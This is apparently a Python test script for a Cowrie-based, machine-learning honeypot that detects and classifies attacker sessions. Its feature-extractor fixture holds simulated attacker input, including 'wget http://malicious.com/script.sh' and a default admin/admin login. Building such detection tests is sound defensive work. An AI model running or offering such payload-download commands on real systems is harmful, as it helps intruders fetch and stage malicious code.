"""
Test Script for ML-Powered Honeypot
Validates system components and functionality
"""

import sys
import os
import json
import time
import requests
from datetime import datetime
import pandas as pd

# Add src to path
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'src'))

from ml.feature_extractor import FeatureExtractor
from ml.threat_classifier import ThreatClassifier
from adaptation.dynamic_adaptation import DynamicAdaptationEngine

def test_feature_extractor():
    """Test feature extraction functionality"""
    print("Testing Feature Extractor...")
    
    # Create sample session data
    sample_sessions = [
        {
            "timestamp": "2024-01-15T10:30:00.000Z",
            "session": "test_session_001",
            "eventid": "cowrie.login.failed",
            "username": "admin",
            "password": "wrongpass",
            "src_ip": "192.168.1.100"
        },
        {
            "timestamp": "2024-01-15T10:30:05.000Z",
            "session": "test_session_001",
            "eventid": "cowrie.login.success",
            "username": "admin",
            "password": "admin",
            "src_ip": "192.168.1.100"
        },
        {
            "timestamp": "2024-01-15T10:30:10.000Z",
            "session": "test_session_001",
            "eventid": "cowrie.command.input",
            "input": "ls -la",
            "src_ip": "192.168.1.100"
        },
        {
            "timestamp": "2024-01-15T10:30:15.000Z",
            "session": "test_session_001",
            "eventid": "cowrie.command.input",
            "input": "whoami",
            "src_ip": "192.168.1.100"
        },
        {
            "timestamp": "2024-01-15T10:30:20.000Z",
            "session": "test_session_001",
            "eventid": "cowrie.command.input",
            "input": "wget http://malicious.com/script.sh",
            "src_ip": "192.168.1.100"
        }
    ]
    
    # Test feature extraction
    extractor = FeatureExtractor()
    features_df = extractor.extract_batch_features(sample_sessions)
    
    if features_df.empty:
        print("❌ Feature extraction failed - no features generated")
        return False
    
    print(f"✅ Feature extraction successful - {len(features_df)} sessions processed")
    print(f"   Features: {list(features_df.columns)}")
    print(f"   Sample features: {features_df.iloc[0].to_dict()}")
    
    return True

def test_threat_classifier():
    """Test threat classification functionality"""
    print("\nTesting Threat Classifier...")
    
    # Create sample features
    sample_features = pd.DataFrame([{
        'session_duration': 120,
        'command_count': 5,
        'unique_commands': 4,
        'failed_logins': 1,
        'successful_logins': 1,
        'login_success_rate': 0.5,
        'suspicious_commands': 1,
        'scanner_commands': 2,
        'command_diversity': 1.5,
        'commands_per_minute': 2.5,
        'suspicious_ratio': 0.2,
        'scanner_ratio': 0.4,
        'is_high_activity': 0,
        'is_suspicious_heavy': 0,
        'is_scanner_heavy': 0,
        'is_long_session': 0,
        'threat_score': 2.5
    }])
    
    # Test classifier
    classifier = ThreatClassifier("test_model.pkl")
    
    # Train with synthetic data
    print("   Training model with synthetic data...")
    metrics = classifier.train(sample_features)
    
    if not classifier.is_trained:
        print("❌ Model training failed")
        return False
    
    print(f"✅ Model trained successfully - Accuracy: {metrics.get('accuracy', 'unknown')}")
    
    # Test prediction
    predictions, confidences = classifier.predict(sample_features)
    
    if not predictions:
        print("❌ Prediction failed")
        return False
    
    print(f"✅ Prediction successful - Threat: {predictions[0]}, Confidence: {confidences[0]:.3f}")
    
    # Clean up test model
    if os.path.exists("test_model.pkl"):
        os.remove("test_model.pkl")
    
    return True

def test_adaptation_engine():
    """Test dynamic adaptation functionality"""
    print("\nTesting Dynamic Adaptation Engine...")
    
    # Create sample data
    sample_sessions = [{
        'session_duration': 60,
        'command_count': 3,
        'suspicious_commands': 0,
        'threat_score': 1.0
    }]
    
    sample_predictions = [('scanner', 0.8)]
    
    # Test adaptation engine
    engine = DynamicAdaptationEngine("configs/config.yaml")
    
    # Test adaptation analysis
    result = engine.analyze_and_adapt(sample_sessions, sample_predictions)
    
    if result.get('status') in ['adapted', 'no_change', 'cooldown']:
        print(f"✅ Adaptation analysis successful - Status: {result.get('status')}")
        if result.get('status') == 'adapted':
            print(f"   Profile change: {result.get('old_profile')} → {result.get('new_profile')}")
    else:
        print(f"❌ Adaptation analysis failed - Status: {result.get('status')}")
        return False
    
    # Test status retrieval
    status = engine.get_adaptation_status()
    print(f"✅ Status retrieval successful - Current profile: {status.get('current_profile')}")
    
    return True

def test_dashboard():
    """Test dashboard functionality"""
    print("\nTesting Dashboard...")
    
    try:
        # Test if dashboard can be imported and initialized
        from monitoring.dashboard import HoneypotDashboard
        
        config = {
            "elasticsearch": {"host": "localhost", "port": 9200},
            "monitoring": {"dashboard_port": 5000}
        }
        
        dashboard = HoneypotDashboard(config)
        print("✅ Dashboard initialization successful")
        
        # Test template creation
        dashboard.create_html_template()
        if os.path.exists("templates/dashboard.html"):
            print("✅ Dashboard template created successfully")
        else:
            print("❌ Dashboard template creation failed")
            return False
        
        return True
        
    except Exception as e:
        print(f"❌ Dashboard test failed: {e}")
        return False

def test_elasticsearch_connection():
    """Test Elasticsearch connection"""
    print("\nTesting Elasticsearch Connection...")
    
    try:
        response = requests.get("http://localhost:9200", timeout=5)
        if response.status_code == 200:
            print("✅ Elasticsearch connection successful")
            return True
        else:
            print(f"❌ Elasticsearch connection failed - Status: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"❌ Elasticsearch connection failed: {e}")
        return False

def test_cowrie_logs():
    """Test Cowrie log file access"""
    print("\nTesting Cowrie Log Access...")
    
    log_path = "/var/log/cowrie/cowrie.json"
    
    if os.path.exists(log_path):
        try:
            with open(log_path, 'r') as f:
                lines = f.readlines()
            print(f"✅ Cowrie logs accessible - {len(lines)} log entries found")
            return True
        except Exception as e:
            print(f"❌ Cowrie log access failed: {e}")
            return False
    else:
        print(f"❌ Cowrie log file not found at {log_path}")
        return False

def run_integration_test():
    """Run a complete integration test"""
    print("\nRunning Integration Test...")
    
    try:
        # Import main application
        sys.path.append(os.path.dirname(__file__))
        from main import MLHoneypot
        
        # Create honeypot instance
        honeypot = MLHoneypot("configs/config.yaml")
        
        # Test status
        status = honeypot.get_status()
        print(f"✅ Main application initialization successful")
        print(f"   Model trained: {status.get('model_trained')}")
        print(f"   Current profile: {status.get('current_profile')}")
        
        return True
        
    except Exception as e:
        print(f"❌ Integration test failed: {e}")
        return False

def main():
    """Run all tests"""
    print("ML-Powered Honeypot System Tests")
    print("=" * 50)
    
    tests = [
        ("Feature Extractor", test_feature_extractor),
        ("Threat Classifier", test_threat_classifier),
        ("Adaptation Engine", test_adaptation_engine),
        ("Dashboard", test_dashboard),
        ("Elasticsearch Connection", test_elasticsearch_connection),
        ("Cowrie Logs", test_cowrie_logs),
        ("Integration Test", run_integration_test)
    ]
    
    results = []
    
    for test_name, test_func in tests:
        try:
            result = test_func()
            results.append((test_name, result))
        except Exception as e:
            print(f"❌ {test_name} test crashed: {e}")
            results.append((test_name, False))
    
    # Summary
    print("\n" + "=" * 50)
    print("Test Results Summary:")
    print("=" * 50)
    
    passed = 0
    total = len(results)
    
    for test_name, result in results:
        status = "✅ PASS" if result else "❌ FAIL"
        print(f"{test_name:.<30} {status}")
        if result:
            passed += 1
    
    print(f"\nOverall: {passed}/{total} tests passed")
    
    if passed == total:
        print("🎉 All tests passed! System is ready for deployment.")
        return True
    else:
        print("⚠️  Some tests failed. Please check the issues above.")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
